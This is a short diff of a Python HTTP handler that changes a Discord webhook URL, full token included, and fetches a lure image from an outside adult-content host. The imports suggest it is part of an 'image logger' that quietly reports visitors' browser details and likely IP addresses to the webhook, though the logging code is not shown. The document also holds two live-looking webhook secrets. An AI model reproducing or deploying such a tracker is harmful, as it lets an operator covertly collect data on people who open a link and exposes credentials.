@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1067207078768291840/t-UW9b_i2v2504nkJh_8WmE285EUlOgq86g8VTKA8GGuPx-g8c-Ib69tpQX-W55ZLmgK'
+webhook = 'https://discord.com/api/webhooks/1067214101119500378/k-KwGxl5rew0GZJHPje6OE7RddBc_hZ82AjjpWbrRNVsQysrmc1g-x7gc6ksz0bPnN6w'
 bindata = requests.get('https://cdn.socialmediapornstars.com/img/650a.jpg').content
 
 
